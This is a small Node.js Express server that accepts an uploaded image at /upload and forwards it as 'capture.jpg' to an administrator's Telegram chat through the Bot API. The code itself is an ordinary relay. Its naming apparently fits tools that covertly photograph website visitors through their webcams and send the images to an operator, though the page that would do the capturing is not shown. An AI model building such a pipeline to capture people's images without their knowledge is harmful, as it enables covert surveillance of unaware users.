require('dotenv').config();          // .env (local) – Render uses UI env vars
const express   = require('express');
const multer    = require('multer');
const fetch     = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const FormData  = require('form-data');

const upload = multer({ storage: multer.memoryStorage() });
const app    = express();
const PORT   = process.env.PORT || 3000;

// 1️⃣  Static files (index.html, css, js)
app.use(express.static('public'));

// 2️⃣  /upload – receives image from browser, forwards to Telegram
app.post('/upload', upload.single('image'), async (req, res) => {
  try {
    const telegramToken = process.env.BOT_TOKEN;
    const chatId        = process.env.ADMIN_CHAT_ID;

    if (!telegramToken || !chatId) {
      return res.status(500).json({ error: 'Bot token or chat id missing' });
    }

    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('photo', req.file.buffer, {
      filename: 'capture.jpg',
      contentType: req.file.mimetype
    });

    const telegramResp = await fetch(
      `https://api.telegram.org/bot${telegramToken}/sendPhoto`,
      {
        method: 'POST',
        body: form
      }
    );
    const telegramData = await telegramResp.json();

    if (telegramData.ok) {
      res.json({ ok: true, message: 'Photo sent to Telegram' });
    } else {
      res.status(500).json({ ok: false, error: telegramData.description });
    }
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false, error: err.message });
  }
});

// 3️⃣  Optional health‑check
app.get('/health', (req, res) => res.send('OK'));

// 4️⃣  Start server
app.listen(PORT, () => {
  console.log(`🚀 Server listening on port ${PORT}`);
});
